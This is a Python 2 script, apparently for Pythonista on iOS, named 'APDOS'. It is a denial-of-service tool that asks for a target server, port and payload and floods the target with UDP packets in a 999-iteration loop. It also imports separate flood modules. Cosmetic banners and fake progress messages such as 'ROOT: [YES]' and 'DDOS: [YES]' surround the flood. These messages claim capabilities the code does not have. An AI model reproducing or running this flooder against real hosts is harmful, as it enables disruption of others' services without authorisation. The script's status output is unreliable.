from __future__ import print_function
import socket, sys, os, time, itertools, threading, speech, console
console.set_font()
console.set_color()
if len(sys.argv) > 1:
	pass
else:
	print("")
	print("      -+--=:=-  -+-  -=:=--+-")
	console.set_color(0, 130, 0)
	print("        Please Set sys.argv")
	console.set_color()
	print("      -+--=:=-  -+-  -=:=--+-")
	console.set_color(0, 130, 0)
	print("               Usage")
	print("        <Strength> <Colour>")
	console.set_color()
	print("      -+--=:=-  -+-  -=:=--+-")
	print("")
	sys.exit()
if sys.argv[2] == "blue":
	color = "blue"
if sys.argv[2] == "red":
	color = "red"
if sys.argv[2] == "green":
	color = "green"
if sys.argv[2] == "yellow":
	color = "yellow"
if sys.argv[2] == "aqua":
	color = "aqua"
if sys.argv[2] == "sexy":
	color = "sexy"
if int(sys.argv[1]) <= 2:
	import thelogo
console.set_font('System-Bold', 15)
print("###################################")
try:
	if color == "blue":
		console.set_color(0, 0, 130)
	if color == "red":
		console.set_color(130, 0, 0)
	if color == "yellow":
		console.set_color(130, 130, 0)
	if color == "aqua":
		console.set_color(0, 130, 130)
	if color == "sexy":
		console.set_color(130, 0, 130)
	if color == "green":
		console.set_color(0, 130, 0)
except:
	console.set_color(130, 0, 0)
print("     _    ____  ____   ___  ____ ")
print("    / \  |  _ \|  _ \ / _ \/ ___|")
print("   / _ \ | |_) | | | | | | \___ \ ")
print("  / ___ \|  __/| |_| | |_| |___) )")
print(" /_/   \_\_|   |____/ \___/|____/ ")
print("")
console.set_color()
print("###################################")
print("")
console.set_font()
print("     -=-+- -+-=-  -=-+- -+-=-")
console.set_font('AmericanTypewriter', 15)
print(" " * 29 + "- APDOS -")
console.set_font()
print("     -=-+- -+-=-  -=-+- -+-=-")
print("     -+-=-    Version   -=-+-")
print("     -+-=-     GREAT    -=-+-")
print("     -+-=-    OKAYISH   -=-+-")
print("     -+-=-   FEEDBACKS  -=-+-")
print("     -=-+- -+-=-  -=-+- -+-=-")
version = raw_input("     -+-=- ")
print("     -=-+- -+-=-  -=-+- -+-=-\n")
time.sleep(1)
try:
	if color == "blue":
		console.set_color(0, 0, 130)
	if color == "red":
		console.set_color(130, 0, 0)
	if color == "yellow":
		console.set_color(130, 130, 0)
	if color == "aqua":
		console.set_color(0, 130, 130)
	if color == "sexy":
		console.set_color(130, 0, 130)
	if color == "green":
		console.set_color(0, 130, 0)
except:
	console.set_color(130, 0, 0)
server = raw_input("[ ] SERVER: ")
port = raw_input("[ ] PORT: ")
type = raw_input("[ ] PAYLOAD: ")
console.set_color()
if port == '':
	port = 80
if type == "skip":
	type = "0x552810401b"
	def udp():
		import UDPdos
		import console
		try:
			if color == "blue":
				console.set_color(0, 0, 130)
			if color == "red":
				console.set_color(130, 0, 0)
			if color == "yellow":
				console.set_color(130, 130, 0)
			if color == "aqua":
				console.set_color(0, 130, 130)
			if color == "sexy":
				console.set_color(130, 0, 130)
			if color == "green":
				console.set_color(0, 130, 0)
		except:
			console.set_color(130, 0, 0)
		print("")
		print("      -=-+- -+-=-  -=-+- -+-=-")
		print("         - APDOS COMPLETE -   ")
		print("      -=-+- -+-=-  -=-+- -+-=-")
		console.set_color()
		quit()
	def feed():
		import apdosFEED
		import console
		try:
			if color == "blue":
				console.set_color(0, 0, 130)
			if color == "red":
				console.set_color(130, 0, 0)
			if color == "yellow":
				console.set_color(130, 130, 0)
			if color == "aqua":
				console.set_color(0, 130, 130)
			if color == "sexy":
				console.set_color(130, 0, 130)
			if color == "green":
				console.set_color(0, 130, 0)
		except:
			console.set_color(130, 0, 0)
		print("")
		print("      -=-+- -+-=-  -=-+- -+-=-")
		print("         - APDOS COMPLETE -   ")
		print("      -=-+- -+-=-  -=-+- -+-=-")
		console.set_color()
		quit()
	if (version == "GREAT"):
		udp()
	if (version == "g"):
		udp()
	if (version == "G"):
		udp()
	if (version == "great"):
		udp()
	if (version == "f"):
		feed()
	if (version == "F"):
		feed()
	if (version == "feedbacks"):
		feed()
	if (version == "FEEDBACKS"):
		feed()
	def attack():
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
		s.sendto(type, (server, int(port)))
		print("Data: " + type)
		print("Server: " + server + ":" + port)
		s.close()
	for i in range(1, 1000):
		attack()
	import console
	try:
			if color == "blue":
				console.set_color(0, 0, 130)
			if color == "red":
				console.set_color(130, 0, 0)
			if color == "yellow":
				console.set_color(130, 130, 0)
			if color == "aqua":
				console.set_color(0, 130, 130)
			if color == "sexy":
				console.set_color(130, 0, 130)
			if color == "green":
				console.set_color(0, 130, 0)
	except:
		console.set_color(130, 0, 0)
	print("")
	print("      -=-+- -+-=-  -=-+- -+-=-")
	print("         - APDOS COMPLETE -   ")
	print("      -=-+- -+-=-  -=-+- -+-=-")
	console.set_color()
	sys.exit()
print("")
print("-+--=- " + server  + " -=--+-\n")
print("-+--=- " + type + " -=--+-")
done = False
def animate():
	for c in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		sys.stdout.write('\rLocating         ' + c)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rLocating    [COMPLETE]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True
done1 = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done1:
			break
		sys.stdout.write('\rConnecting       ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rConnecting  [COMPLETE]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done1 = True
done2 = False
def animate():
	for c in itertools.cycle(['|', '/', '-', '\\']):
		if done2:
			break
		sys.stdout.write('\rActivation       ' + c)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rActivation  [COMPLETE]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(3)
done2 = True
done = False
def animate():
	for c in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		sys.stdout.write('\rBooting          ' + c)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rBooting     [COMPLETE]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(5)
done = True
done1 = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done1:
			break
		sys.stdout.write('\rROOT:    ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rROOT:  [YES]\n')
t = threading.Thread(target=animate)
t.start()
time.sleep(2)
done1 = True
donea = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		sys.stdout.write('\rVPNS:    ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	try:
		from urllib2 import urlopen
		myip = urlopen('http://ip.42.pl/raw').read()
		hname = socket.gethostbyaddr(myip)
		vpn = "[NO]"
	except:
		vpn = "[YES]"
	sys.stdout.write('\rVPNS:  ' + vpn + '\n')
t = threading.Thread(target=animate)
t.start()
time.sleep(2)
donea = True
donea = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		sys.stdout.write('\rAUTH:    ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rAUTH:  [YES]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(2)
donea = True
donea = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		sys.stdout.write('\rDDOS:    ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	sys.stdout.write('\rDDOS:  [YES]\n     ')
t = threading.Thread(target=animate)
t.start()
time.sleep(2)
done = True
donea = False
def animate():
	for d in itertools.cycle(['|', '/', '-', '\\']):
		if done:
			break
		conn = socket.getservbyport(int(port))
		sys.stdout.write('\r' + conn + ':' + '         ' + d)
		sys.stdout.flush()
		time.sleep(0.1)
	conn = socket.getservbyport(int(port))
	sys.stdout.write('\r' + conn + ':' + '  ' + '[YES]\n')
t = threading.Thread(target=animate)
t.start()
time.sleep(2)
donea = True
def udp():
	import UDPdos
	import console
	try:
			if color == "blue":
				console.set_color(0, 0, 130)
			if color == "red":
				console.set_color(130, 0, 0)
			if color == "yellow":
				console.set_color(130, 130, 0)
			if color == "aqua":
				console.set_color(0, 130, 130)
			if color == "sexy":
				console.set_color(130, 0, 130)
			if color == "green":
				console.set_color(0, 130, 0)
	except:
		console.set_color(130, 0, 0)
	print("")
	print("      -=-+- -+-=-  -=-+- -+-=-")
	print("         - APDOS COMPLETE -   ")
	print("      -=-+- -+-=-  -=-+- -+-=-")
	console.set_color()
	quit()
def feed():
	import apdosFEED
	import console
	try:
			if color == "blue":
				console.set_color(0, 0, 130)
			if color == "red":
				console.set_color(130, 0, 0)
			if color == "yellow":
				console.set_color(130, 130, 0)
			if color == "aqua":
				console.set_color(0, 130, 130)
			if color == "sexy":
				console.set_color(130, 0, 130)
			if color == "green":
				console.set_color(0, 130, 0)
	except:
		console.set_color(130, 0, 0)
	print("")
	print("      -=-+- -+-=-  -=-+- -+-=-")
	print("         - APDOS COMPLETE -   ")
	print("      -=-+- -+-=-  -=-+- -+-=-")
	console.set_color()
	quit()
if (version == "GREAT"):
	udp()
if (version == "g"):
	udp()
if (version == "G"):
	udp()
if (version == "great"):
	udp()
if (version == "f"):
	feed()
if (version == "F"):
	feed()
if (version == "feedbacks"):
	feed()
if (version == "FEEDBACKS"):
	feed()
def attack():
	type = "0x7392a88716b"
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
	s.sendto(type, (server, int(port)))
	print("Data: " + type)
	print("Server: " + server + ":" + port)
	s.close()
for i in range(1, 1000):
	attack()
try:
	if color == "blue":
		console.set_color(0, 0, 130)
	if color == "red":
		console.set_color(130, 0, 0)
	if color == "yellow":
		console.set_color(130, 130, 0)
	if color == "aqua":
		console.set_color(0, 130, 130)
	if color == "sexy":
		console.set_color(130, 0, 130)
	if color == "green":
		console.set_color(0, 130, 0)
except:
	console.set_color(130, 0, 0)
print("")
print("      -=-+- -+-=-  -=-+- -+-=-")
print("         - APDOS COMPLETE -   ")
print("      -=-+- -+-=-  -=-+- -+-=-")
console.set_color()
sys.exit()
